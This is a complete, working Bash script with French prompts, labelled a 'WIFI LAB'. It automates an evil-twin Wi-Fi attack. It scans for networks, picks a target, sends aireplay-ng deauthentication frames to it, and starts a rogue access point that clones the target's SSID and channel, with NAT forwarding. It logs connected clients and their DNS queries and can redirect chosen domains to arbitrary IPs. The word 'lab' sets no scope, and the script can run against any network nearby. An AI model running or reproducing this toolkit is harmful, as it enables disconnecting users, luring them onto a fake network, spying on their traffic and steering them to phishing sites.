#!/usr/bin/env bash

# ============================================================
#                         WIFI LAB
# ============================================================

set -u
set -o pipefail

# ---------------- CONFIGURATION ----------------

INTERNET_INTERFACE="eth0"

AP_IP="192.168.50.1"
AP_NETWORK="192.168.50.0/24"

DHCP_START="192.168.50.10"
DHCP_END="192.168.50.100"

DNSMASQ_CONF="/tmp/wifi-lab-dnsmasq.conf"
DNS_LOG="/tmp/wifi-lab-dns.log"
DNS_REDIRECT_CONF="/tmp/wifi-lab-dns-redirect.conf"
HOSTAPD_CONF="/tmp/wifi-lab-hostapd.conf"

DNSMASQ_PID="/tmp/wifi-lab-dnsmasq.pid"
HOSTAPD_PID="/tmp/wifi-lab-hostapd.pid"

CLIENT_LOG="/tmp/wifi-lab-clients.log"

INTERFACE=""
MONITOR_INTERFACE=""
AP_INTERFACE=""

TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CHANNEL=""

AP_ESSID=""
CLIENT_MONITOR_PID=""

# ============================================================
# AFFICHAGE
# ============================================================

info() {
    echo "[INFO] $*"
}

ok() {
    echo "[ OK ] $*"
}

warn() {
    echo "[WARN] $*"
}

error() {
    echo "[ERREUR] $*" >&2
}

line() {
    echo "------------------------------------------------------------"
}

pause_screen() {
    echo
    read -r -p "Appuie sur Entrée pour continuer..."
}

# ============================================================
# ROOT
# ============================================================

check_root() {

    if [ "$EUID" -ne 0 ]; then
        error "Lance le script avec sudo."
        echo "sudo ./script.sh"
        exit 1
    fi
}

# ============================================================
# DEPENDANCES
# ============================================================

check_dependencies() {

    local commands=(
        ip
        iw
        awk
        sed
        grep
        timeout
        airmon-ng
        airodump-ng
        aireplay-ng
        hostapd
        dnsmasq
        iptables
    )

    info "Vérification des dépendances..."

    for command in "${commands[@]}"; do

        if ! command -v "$command" >/dev/null 2>&1; then
            error "Commande manquante : $command"
            exit 1
        fi

    done

    ok "Dépendances OK."
}

# ============================================================
# INTERFACES WIFI
# ============================================================

get_wifi_interfaces() {

    iw dev 2>/dev/null |
        awk '$1 == "Interface" {print $2}'
}

show_interfaces() {

    clear

    line
    echo "                    INTERFACES WIFI"
    line
    echo

    local interfaces
    interfaces=$(get_wifi_interfaces)

    if [ -z "$interfaces" ]; then
        error "Aucune interface Wi-Fi détectée."
        iw dev
        pause_screen
        return
    fi

    local number=1
    local iface

    while read -r iface; do

        [ -z "$iface" ] && continue

        echo "$number) $iface"

        number=$((number + 1))

    done <<< "$interfaces"

    pause_screen
}

# ============================================================
# CHOIX INTERFACE
# ============================================================

choose_interface() {

    local interfaces
    interfaces=$(get_wifi_interfaces)

    if [ -z "$interfaces" ]; then
        error "Aucune interface Wi-Fi disponible."
        return 1
    fi

    clear

    line
    echo "                    CHOIX INTERFACE"
    line
    echo

    local number=1
    local iface

    while read -r iface; do

        [ -z "$iface" ] && continue

        echo "$number) $iface"

        number=$((number + 1))

    done <<< "$interfaces"

    echo

    while true; do

        read -r -p "Votre choix : " choice

        if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
            warn "Choix invalide."
            continue
        fi

        INTERFACE=$(echo "$interfaces" |
            sed -n "${choice}p")

        if [ -n "$INTERFACE" ]; then
            break
        fi

        warn "Choix invalide."

    done

    ok "Interface sélectionnée : $INTERFACE"
}

# ============================================================
# MODE MONITOR
# ============================================================

start_monitor() {

    if [ -z "$INTERFACE" ]; then
        error "Aucune interface sélectionnée."
        return 1
    fi

    line
    info "Activation du mode monitor..."
    line

    airmon-ng check kill >/dev/null 2>&1 || true

    sleep 1

    airmon-ng start "$INTERFACE" >/dev/null 2>&1 || {
        error "Impossible d'activer le mode monitor."
        return 1
    }

    sleep 2

    MONITOR_INTERFACE=""

    if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then

        MONITOR_INTERFACE="${INTERFACE}mon"

    else

        MONITOR_INTERFACE=$(
            iw dev 2>/dev/null |
            awk '$1=="Interface" {print $2}' |
            grep 'mon$' |
            head -n 1
        )

    fi

    if [ -z "$MONITOR_INTERFACE" ]; then
        error "Interface monitor introuvable."
        return 1
    fi

    ok "Interface monitor : $MONITOR_INTERFACE"
}

# ============================================================
# SCAN WIFI
# ============================================================

scan_networks() {

    if [ -z "$MONITOR_INTERFACE" ]; then
        error "Active d'abord le mode monitor."
        pause_screen
        return 1
    fi

    local scan_dir="/tmp/wifi-lab-scan"

    mkdir -p "$scan_dir"

    rm -f "$scan_dir"/scan-* 2>/dev/null

    clear

    line
    echo "                     SCAN WIFI"
    line
    echo

    info "Scan de 10 secondes..."

    timeout --foreground 10 \
        airodump-ng \
        "$MONITOR_INTERFACE" \
        --write "$scan_dir/scan" \
        --output-format csv \
        >/dev/null 2>&1 || true

    if [ ! -f "$scan_dir/scan-01.csv" ]; then
        error "Aucun résultat de scan."
        pause_screen
        return 1
    fi

    ok "Scan terminé."
}

# ============================================================
# CHOIX RESEAU
# ============================================================

choose_network() {

    local csv="/tmp/wifi-lab-scan/scan-01.csv"

    if [ ! -f "$csv" ]; then
        error "Effectue d'abord un scan."
        pause_screen
        return 1
    fi

    mapfile -t networks < <(

        awk -F',' '
        NR > 1 &&
        $1 ~ /^[[:space:]]*[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}[[:space:]]*$/ {

            bssid=$1
            channel=$4
            essid=$14

            gsub(/^[ \t]+|[ \t]+$/, "", bssid)
            gsub(/^[ \t]+|[ \t]+$/, "", channel)
            gsub(/^[ \t]+|[ \t]+$/, "", essid)

            if (essid == "")
                essid="<SSID caché>"

            print bssid "|" channel "|" essid
        }
        ' "$csv"
    )

    if [ "${#networks[@]}" -eq 0 ]; then
        error "Aucun réseau trouvé."
        pause_screen
        return 1
    fi

    clear

    line
    echo "                     RESEAUX WIFI"
    line
    echo

    local number=1
    local entry
    local bssid
    local channel
    local essid

    for entry in "${networks[@]}"; do

        IFS='|' read -r bssid channel essid <<< "$entry"

        echo "$number) $essid"
        echo "   BSSID : $bssid"
        echo "   Canal : $channel"
        echo

        number=$((number + 1))

    done

    while true; do

        read -r -p "Choisis un réseau : " choice

        if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
            warn "Choix invalide."
            continue
        fi

        if [ "$choice" -lt 1 ] ||
           [ "$choice" -gt "${#networks[@]}" ]; then

            warn "Choix invalide."
            continue
        fi

        break
    done

    IFS='|' read -r \
        TARGET_BSSID \
        TARGET_CHANNEL \
        TARGET_ESSID <<< "${networks[$((choice - 1))]}"

    echo
    ok "Réseau sélectionné."
    echo "SSID   : $TARGET_ESSID"
    echo "BSSID  : $TARGET_BSSID"
    echo "Canal  : $TARGET_CHANNEL"
}

# ============================================================
# DEAUTH ATTACK (AIREPLAY-NG)
# ============================================================

deauth_attack() {

    if [ -z "$MONITOR_INTERFACE" ]; then
        error "Active d'abord le mode monitor (option 2)."
        pause_screen
        return 1
    fi

    if [ -z "$TARGET_BSSID" ]; then
        error "Sélectionne d'abord un réseau cible (option 4)."
        pause_screen
        return 1
    fi

    clear

    line
    echo "                  COMMANDE AIREPLAY-NG"
    line
    echo

    echo "Cible  : $TARGET_ESSID"
    echo "BSSID  : $TARGET_BSSID"
    echo "Iface  : $MONITOR_INTERFACE"
    echo

    sudo aireplay-ng -0 1 -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
    local status=$?

    echo
    line

    if [ "$status" -eq 0 ]; then
        ok "Attaque deauth terminée avec succès."
    else
        error "Erreur lors de l'exécution d'aireplay-ng (code $status)."
    fi

    pause_screen
}

# ============================================================
# RETOUR MODE MANAGED
# ============================================================

restore_managed() {

    info "Retour en mode managed..."

    if [ -n "$MONITOR_INTERFACE" ]; then

        if ip link show "$MONITOR_INTERFACE" >/dev/null 2>&1; then

            airmon-ng stop "$MONITOR_INTERFACE" \
                >/dev/null 2>&1 || true

            sleep 3

        fi

    fi

    MONITOR_INTERFACE=""

    if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
        error "Interface Wi-Fi introuvable : $INTERFACE"
        return 1
    fi

    AP_INTERFACE="$INTERFACE"

    ip link set "$AP_INTERFACE" down 2>/dev/null || true

    iw dev "$AP_INTERFACE" set type managed \
        2>/dev/null || true

    ip link set "$AP_INTERFACE" up

    sleep 2

    ok "Interface AP : $AP_INTERFACE"
}

# ============================================================
# CONFIGURATION IP
# ============================================================

configure_ap_ip() {

    info "Configuration IP de l'AP..."

    ip link set "$AP_INTERFACE" down

    ip addr flush dev "$AP_INTERFACE"

    ip addr add "$AP_IP/24" dev "$AP_INTERFACE"

    ip link set "$AP_INTERFACE" up

    sleep 2

    if ! ip addr show "$AP_INTERFACE" |
        grep -q "192.168.50.1/24"; then

        error "Impossible d'attribuer $AP_IP."
        return 1
    fi

    ok "Adresse AP : $AP_IP"
}

# ============================================================
# FORWARDING
# ============================================================

configure_forwarding() {

    info "Activation du forwarding IPv4..."

    sysctl -w net.ipv4.ip_forward=1 >/dev/null

    ok "Forwarding activé."
}

# ============================================================
# NAT
# ============================================================

configure_nat() {

    info "Configuration du NAT..."

    iptables -t nat -A POSTROUTING \
        -s "$AP_NETWORK" \
        -o "$INTERNET_INTERFACE" \
        -j MASQUERADE

    iptables -A FORWARD \
        -i "$AP_INTERFACE" \
        -o "$INTERNET_INTERFACE" \
        -s "$AP_NETWORK" \
        -j ACCEPT

    iptables -A FORWARD \
        -i "$INTERNET_INTERFACE" \
        -o "$AP_INTERFACE" \
        -d "$AP_NETWORK" \
        -m conntrack \
        --ctstate ESTABLISHED,RELATED \
        -j ACCEPT

    ok "NAT configuré."
}

# ============================================================
# DNSMASQ
# ============================================================

start_dnsmasq() {

    info "Configuration de dnsmasq..."

    touch "$DNS_REDIRECT_CONF"
    chmod 644 "$DNS_REDIRECT_CONF"

    rm -f "$DNS_LOG"
    touch "$DNS_LOG"
    chmod 640 "$DNS_LOG"

    cat > "$DNSMASQ_CONF" <<EOF
interface=$AP_INTERFACE
bind-interfaces
listen-address=$AP_IP

dhcp-range=$DHCP_START,$DHCP_END,255.255.255.0,12h

dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP

server=8.8.8.8
server=1.1.1.1

no-resolv

# Redirections DNS du laboratoire.
conf-file=$DNS_REDIRECT_CONF

log-dhcp
log-queries
log-facility=-
EOF

    if ! dnsmasq --test --conf-file="$DNSMASQ_CONF"; then
        error "Configuration dnsmasq invalide."
        return 1
    fi

    if [ -f "$DNSMASQ_PID" ]; then
        kill "$(cat "$DNSMASQ_PID")" 2>/dev/null || true
        rm -f "$DNSMASQ_PID"
        sleep 1
    fi

    info "Démarrage de dnsmasq..."

    dnsmasq \
        --conf-file="$DNSMASQ_CONF" \
        --keep-in-foreground \
        >> "$DNS_LOG" 2>&1 &

    DNSMASQ_PID_VALUE=$!
    echo "$DNSMASQ_PID_VALUE" > "$DNSMASQ_PID"

    sleep 2

    if ! kill -0 "$DNSMASQ_PID_VALUE" 2>/dev/null; then
        error "dnsmasq n'a pas démarré."
        rm -f "$DNSMASQ_PID"
        return 1
    fi

    ok "dnsmasq actif."
}

# ============================================================
# HOSTAPD
# ============================================================

start_hostapd() {

    AP_ESSID="$TARGET_ESSID"

    info "Configuration de hostapd..."

    cat > "$HOSTAPD_CONF" <<EOF
interface=$AP_INTERFACE
driver=nl80211

ssid=$AP_ESSID

hw_mode=g
channel=$TARGET_CHANNEL

auth_algs=1
wmm_enabled=1
EOF

    info "Démarrage de hostapd..."

    hostapd \
        -B \
        -P "$HOSTAPD_PID" \
        "$HOSTAPD_CONF" \
        >/tmp/wifi-lab-hostapd.log 2>&1

    sleep 2

    if [ ! -f "$HOSTAPD_PID" ]; then

        error "hostapd n'a pas démarré."

        cat /tmp/wifi-lab-hostapd.log

        return 1
    fi

    local pid
    pid=$(cat "$HOSTAPD_PID" 2>/dev/null || true)

    if [ -z "$pid" ] ||
       ! kill -0 "$pid" 2>/dev/null; then

        error "hostapd n'est pas actif."

        cat /tmp/wifi-lab-hostapd.log

        return 1
    fi

    ok "hostapd actif."
}

# ============================================================
# MONITORING CLIENTS
# ============================================================

start_client_monitor() {

    if [ -n "$CLIENT_MONITOR_PID" ]; then
        return 0
    fi

    touch "$CLIENT_LOG"

    (
        declare -A known_clients

        while true; do

            [ -z "$AP_INTERFACE" ] && sleep 3 && continue

            current=$(
                iw dev "$AP_INTERFACE" station dump \
                    2>/dev/null |
                awk '
                    /^Station/ {

                        if (mac != "")
                            print mac "|" signal

                        mac=$2
                        signal="?"

                    }

                    /signal:/ {
                        signal=$2
                    }

                    END {

                        if (mac != "")
                            print mac "|" signal

                    }
                '
            )

            declare -A seen

            while IFS='|' read -r mac signal; do

                [ -z "$mac" ] && continue

                seen["$mac"]=1

                if [ -z "${known_clients[$mac]+x}" ]; then

                    echo "[$(date '+%Y-%m-%d %H:%M:%S')] CONNECT $mac signal=$signal dBm" \
                        >> "$CLIENT_LOG"

                fi

                known_clients["$mac"]="$signal"

            done <<< "$current"

            for mac in "${!known_clients[@]}"; do

                if [ -z "${seen[$mac]+x}" ]; then

                    echo "[$(date '+%Y-%m-%d %H:%M:%S')] DISCONNECT $mac" \
                        >> "$CLIENT_LOG"

                    unset 'known_clients[$mac]'

                fi

            done

            sleep 3

        done

    ) &

    CLIENT_MONITOR_PID=$!

    ok "Monitoring clients actif."
}

# ============================================================
# CLIENTS CONNECTES
# ============================================================

show_clients() {

    clear

    line
    echo "                    CLIENTS CONNECTES"
    line
    echo

    if [ -z "$AP_INTERFACE" ]; then
        warn "Aucun AP actif."
        pause_screen
        return
    fi

    printf "%-20s %-12s %-15s %-20s\n" \
        "MAC" "SIGNAL" "TEMPS" "NOM"

    line

    iw dev "$AP_INTERFACE" station dump 2>/dev/null |
        awk '
        /^Station/ {

            if (mac != "")
                printf "%s|%s|%s\n", mac, signal, time

            mac=$2
            signal="?"
            time="?"
        }

        /signal:/ {
            signal=$2 " dBm"
        }

        /connected time:/ {
            time=$3 " s"
        }

        END {
            if (mac != "")
                printf "%s|%s|%s\n", mac, signal, time
        }
        ' |
    while IFS='|' read -r mac signal time; do

        [ -z "$mac" ] && continue

        ip=""

        if [ -f /var/lib/misc/dnsmasq.leases ]; then
            ip=$(awk -v mac="$mac" '$2 == mac {print $3; exit}' \
                /var/lib/misc/dnsmasq.leases)
        fi

        name="Inconnu"

        if [ -f /var/lib/misc/dnsmasq.leases ]; then

            dhcp_name=$(awk -v mac="$mac" '$2 == mac {print $4; exit}' \
                /var/lib/misc/dnsmasq.leases)

            if [ -n "$dhcp_name" ] && [ "$dhcp_name" != "*" ]; then
                name="$dhcp_name"
            fi
        fi

        if [ "$name" = "Inconnu" ] && [ -n "$ip" ]; then

            dns_name=$(getent hosts "$ip" 2>/dev/null |
                awk '{print $2}' |
                head -n 1)

            if [ -n "$dns_name" ]; then
                name="$dns_name"
            fi
        fi

        printf "%-20s %-12s %-15s %-20s\n" \
            "$mac" "$signal" "$time" "$name"

    done

    echo
    line
    echo "                         DHCP"
    line
    echo

    if [ -f /var/lib/misc/dnsmasq.leases ]; then

        printf "%-20s %-16s %-20s\n" \
            "MAC" "IP" "NOM"

        line

        while read -r expiry mac ip hostname clientid; do

            [ -z "$mac" ] && continue

            name="$hostname"

            if [ -z "$name" ] || [ "$name" = "*" ]; then
                name="Inconnu"
            fi

            printf "%-20s %-16s %-20s\n" \
                "$mac" "$ip" "$name"

        done < /var/lib/misc/dnsmasq.leases

    else

        echo "Aucun bail DHCP."

    fi

    pause_screen
}

# ============================================================
# REDIRECTION DNS
# ============================================================

configure_dns_redirect() {

    clear

    line
    echo "                  CONFIGURATION DNS"
    line
    echo

    if [ -z "$AP_INTERFACE" ] || [ -z "$AP_ESSID" ]; then
        warn "L'AP de laboratoire doit être actif."
        echo "Utilise d'abord l'option 6."
        pause_screen
        return
    fi

    echo "Domaine à rediriger vers une adresse IPv4."
    echo "Exemple : test.lab -> 192.168.50.10"
    echo

    local domain
    local ip
    local octet
    local octets

    read -r -p "Domaine à rediriger : " domain
    read -r -p "Adresse IP de destination : " ip

    if ! [[ "$domain" =~ ^([A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?)$ ]]; then
        error "Nom de domaine invalide."
        pause_screen
        return 1
    fi

    if ! [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        error "Adresse IPv4 invalide."
        pause_screen
        return 1
    fi

    IFS='.' read -r -a octets <<< "$ip"

    for octet in "${octets[@]}"; do
        if [ "$octet" -gt 255 ]; then
            error "Adresse IPv4 invalide : $ip"
            pause_screen
            return 1
        fi
    done

    touch "$DNS_REDIRECT_CONF"
    chmod 644 "$DNS_REDIRECT_CONF"

    sed -i \
        -E "/^[[:space:]]*address=\\/$domain\\//d" \
        "$DNS_REDIRECT_CONF"

    echo "address=/$domain/$ip" >> "$DNS_REDIRECT_CONF"

    if ! dnsmasq --test --conf-file="$DNSMASQ_CONF" >/dev/null 2>&1; then
        error "Configuration dnsmasq invalide."
        sed -i \
            -E "/^[[:space:]]*address=\\/$domain\\//d" \
            "$DNS_REDIRECT_CONF"
        pause_screen
        return 1
    fi

    if [ -f "$DNSMASQ_PID" ]; then
        kill "$(cat "$DNSMASQ_PID")" 2>/dev/null || true
        rm -f "$DNSMASQ_PID"
        sleep 1
    fi

    dnsmasq \
        --conf-file="$DNSMASQ_CONF" \
        --keep-in-foreground \
        >> "$DNS_LOG" 2>&1 &

    DNSMASQ_PID_VALUE=$!
    echo "$DNSMASQ_PID_VALUE" > "$DNSMASQ_PID"

    sleep 2

    if ! kill -0 "$DNSMASQ_PID_VALUE" 2>/dev/null; then
        error "Impossible de redémarrer dnsmasq."
        rm -f "$DNSMASQ_PID"
        pause_screen
        return 1
    fi

    echo
    line
    echo "                 REDIRECTION ACTIVE"
    line
    echo
    echo "Domaine : $domain"
    echo "IP      : $ip"
    echo
    ok "Règle DNS ajoutée et dnsmasq redémarré."

    pause_screen
}

# ============================================================
# REDIRECTIONS DNS ACTIVES
# ============================================================

show_dns_redirects() {

    clear

    line
    echo "                 REDIRECTIONS DNS"
    line
    echo

    if [ ! -f "$DNS_REDIRECT_CONF" ]; then
        echo "Aucune redirection DNS configurée."
        echo
        pause_screen
        return
    fi

    printf "%-5s %-35s %-18s\n" "N°" "DOMAINE" "IP DESTINATION"
    line

    local count=0

    while IFS= read -r rule; do

        [[ -z "$rule" || "$rule" =~ ^[[:space:]]*# ]] && continue

        if [[ "$rule" =~ ^[[:space:]]*address=/([^/]+)/([^[:space:]]+)[[:space:]]*$ ]]; then
            count=$((count + 1))
            printf "%-5s %-35s %-18s\n" \
                "$count" "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}"
        fi

    done < "$DNS_REDIRECT_CONF"

    echo

    if [ "$count" -eq 0 ]; then
        echo "Aucune redirection DNS configurée."
    else
        line
        echo "Total : $count redirection(s)"
    fi

    echo
    pause_screen
}

# ============================================================
# LOGS RESEAU
# ============================================================

show_network_logs() {

    clear

    line
    echo "                     LOGS RESEAU"
    line
    echo

    echo "==================== DOMAINES DNS ===================="
    echo

    if [ -f "$DNS_LOG" ]; then

        printf "%-20s %-40s\n" \
            "CLIENT" "DOMAINE"

        line

        grep "query\[" "$DNS_LOG" 2>/dev/null |
        awk '
        {
            client=""
            domain=""

            for (i=1; i<=NF; i++) {

                if ($i ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/)
                    client=$i

                if ($i ~ /query\[/) {

                    domain=$i

                    sub(/^.*\] /, "", domain)

                }
            }

            if (client != "" && domain != "")
                printf "%-20s %-40s\n",
                       client, domain
        }
        ' |
        tail -n 100

    else

        echo "Aucune requête DNS."

    fi

    echo
    line

    echo "==================== LOG DNS BRUT ===================="
    echo

    if [ -f "$DNS_LOG" ]; then

        tail -n 50 "$DNS_LOG"

    else

        echo "Aucun log DNS."

    fi

    echo
    line

    pause_screen
}

# ============================================================
# LOGS CLIENTS
# ============================================================

show_client_logs() {

    clear

    line
    echo "                    LOGS CLIENTS"
    line
    echo

    if [ -f "$CLIENT_LOG" ]; then

        tail -n 100 "$CLIENT_LOG"

    else

        echo "Aucun événement."

    fi

    pause_screen
}

# ============================================================
# CREATION AP
# ============================================================

create_lab_ap() {

    if [ -z "$TARGET_ESSID" ]; then
        error "Sélectionne d'abord un réseau."
        pause_screen
        return 1
    fi

    clear

    line
    echo "                 CREATION AP DE LAB"
    line
    echo

    echo "SSID choisi : $TARGET_ESSID"
    echo "Canal       : $TARGET_CHANNEL"
    echo

    if ! ip link show "$INTERNET_INTERFACE" >/dev/null 2>&1; then

        error "Interface Internet inexistante : $INTERNET_INTERFACE"

        pause_screen

        return 1
    fi

    restore_managed || return 1

    configure_ap_ip || return 1

    configure_forwarding || return 1

    configure_nat || return 1

    start_dnsmasq || return 1

    start_hostapd || return 1

    start_client_monitor

    echo
    line
    echo "                       AP ACTIF"
    line
    echo

    echo "SSID      : $AP_ESSID"
    echo "Interface : $AP_INTERFACE"
    echo "Canal     : $TARGET_CHANNEL"
    echo "IP        : $AP_IP"
    echo "DHCP      : $DHCP_START - $DHCP_END"
    echo "Internet  : $INTERNET_INTERFACE"
    echo "DNS log   : $DNS_LOG"

    echo
    ok "AP de laboratoire démarré."

}

# ============================================================
# ARRET AP
# ============================================================

stop_ap() {

    info "Arrêt de l'AP..."

    # ---------------- CLIENT MONITOR ----------------

    if [ -n "$CLIENT_MONITOR_PID" ]; then

        kill "$CLIENT_MONITOR_PID" \
            2>/dev/null || true

        CLIENT_MONITOR_PID=""

    fi

    # ---------------- HOSTAPD ----------------

    if [ -f "$HOSTAPD_PID" ]; then

        kill "$(cat "$HOSTAPD_PID")" \
            2>/dev/null || true

        rm -f "$HOSTAPD_PID"

    fi

    # ---------------- DNSMASQ ----------------

    if [ -f "$DNSMASQ_PID" ]; then

        kill "$(cat "$DNSMASQ_PID")" \
            2>/dev/null || true

        rm -f "$DNSMASQ_PID"

    fi

    # ---------------- IPTABLES ----------------

    if [ -n "$AP_INTERFACE" ]; then

        iptables -D FORWARD \
            -i "$AP_INTERFACE" \
            -o "$INTERNET_INTERFACE" \
            -s "$AP_NETWORK" \
            -j ACCEPT \
            2>/dev/null || true

        iptables -D FORWARD \
            -i "$INTERNET_INTERFACE" \
            -o "$AP_INTERFACE" \
            -d "$AP_NETWORK" \
            -m conntrack \
            --ctstate ESTABLISHED,RELATED \
            -j ACCEPT \
            2>/dev/null || true

    fi

    iptables -t nat -D POSTROUTING \
        -s "$AP_NETWORK" \
        -o "$INTERNET_INTERFACE" \
        -j MASQUERADE \
        2>/dev/null || true

    # ---------------- IP ----------------

    if [ -n "$AP_INTERFACE" ]; then

        ip addr flush dev "$AP_INTERFACE" \
            2>/dev/null || true

    fi

    rm -f "$DNSMASQ_CONF"
    rm -f "$DNS_REDIRECT_CONF"
    rm -f "$DNS_LOG"
    rm -f "$HOSTAPD_CONF"

    AP_ESSID=""

    ok "AP arrêté."
}

# ============================================================
# MENU
# ============================================================

menu() {

    while true; do

        clear

        line
        echo "                       WIFI LAB"
        line
        echo

        echo "Interface Wi-Fi : ${INTERFACE:-Aucune}"
        echo "Réseau choisi   : ${TARGET_ESSID:-Aucun}"
        echo "AP              : ${AP_ESSID:-Inactif}"

        echo
        line
        echo

        echo "1. Afficher les interfaces Wi-Fi"
        echo "2. Activer le mode monitor"
        echo "3. Scanner les réseaux"
        echo "4. Choisir un réseau"
        echo "5. Lancer une attaque deauth (aireplay-ng)"
        echo "6. Créer l'AP de laboratoire"
        echo "7. Voir les clients connectés"
        echo "8. Voir les logs clients"
        echo "9. Voir les logs réseau"
        echo "10. Configurer une redirection DNS"
        echo "11. Voir les redirections DNS"
        echo "12. Arrêter l'AP"
        echo "0. Quitter"

        echo
        line
        echo

        read -r -p "Votre choix : " choice

        case "$choice" in

            1)
                show_interfaces
                ;;

            2)
                [ -z "$INTERFACE" ] && choose_interface
                start_monitor
                pause_screen
                ;;

            3)
                scan_networks
                pause_screen
                ;;

            4)
                choose_network
                pause_screen
                ;;

            5)
                deauth_attack
                ;;

            6)
                create_lab_ap
                pause_screen
                ;;

            7)
                show_clients
                ;;

            8)
                show_client_logs
                ;;

            9)
                show_network_logs
                ;;

            10)
                configure_dns_redirect
                ;;

            11)
                show_dns_redirects
                ;;

            12)
                stop_ap
                pause_screen
                ;;

            0)
                return
                ;;

            *)
                warn "Choix invalide."
                sleep 1
                ;;

        esac

    done
}

# ============================================================
# NETTOYAGE
# ============================================================

cleanup() {

    echo
    line
    info "Nettoyage..."
    line

    stop_ap

    if [ -n "$MONITOR_INTERFACE" ]; then

        if ip link show "$MONITOR_INTERFACE" \
            >/dev/null 2>&1; then

            airmon-ng stop "$MONITOR_INTERFACE" \
                >/dev/null 2>&1 || true

        fi

    fi

    MONITOR_INTERFACE=""

    systemctl restart NetworkManager \
        >/dev/null 2>&1 || true

    ok "Nettoyage terminé."
}

# ============================================================
# CTRL+C
# ============================================================

trap 'cleanup; exit 130' INT TERM

# ============================================================
# MAIN
# ============================================================

main() {

    clear 2>/dev/null || true

    echo
    echo "============================================================"
    echo "                         WIFI LAB"
    echo "============================================================"
    echo

    check_root
    check_dependencies

    choose_interface

    menu

    cleanup

    echo
    ok "Programme terminé."
}

main "$@"